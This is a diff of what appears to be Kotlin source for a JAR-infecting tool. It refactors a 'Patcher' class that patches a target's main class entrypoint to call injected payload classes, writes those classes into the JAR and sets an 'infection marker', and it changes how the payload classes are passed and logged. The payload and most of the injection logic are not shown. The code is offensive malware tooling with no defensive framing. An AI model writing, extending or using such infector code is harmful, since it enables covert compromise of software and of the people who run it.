@@ -122,7 +122,6 @@ private class Patcher(
         Logs.info("[STEP 4] Patching main class entrypoint...")
         modifiedMainClassBytes = patchMainClass(
             originalMainClassBytes = targetInfo.mainClassBytes,
-            finalPayloadClasses = processedPayload.finalClasses,
             finalMainPayloadCallName = processedPayload.finalMainPayloadName.replace('/', '.')
         )
     }
@@ -133,7 +132,7 @@ private class Patcher(
             jarPath = tempJar.toPath(),
             modifiedMainClassBytes = modifiedMainClassBytes,
             mainClassPath = targetInfo.mainClassPath,
-            finalPayloadClasses = processedPayload.finalClasses
+            processedPayload = processedPayload
         )
         setInfectionMarkerOnTarget(tempJar.toPath())
     }
@@ -141,7 +140,8 @@ private class Patcher(
     private fun logSummary() {
         Logs.info(" -> Summary of file changes:")
         Logs.info("  ${yellow("MODIFIED:")} ${targetInfo.mainClassPath}")
-        processedPayload.finalClasses.forEach { classFile ->
+        Logs.info("  ${brightCyan("ADDED:")}    ${processedPayload.finalMainPayloadName.replace('/', '.')}.class")
+        processedPayload.otherClasses.forEach { classFile ->
             Logs.info("  ${brightCyan("ADDED:")}    ${classFile.name.replace('/', '.')}.class")
         }
     }
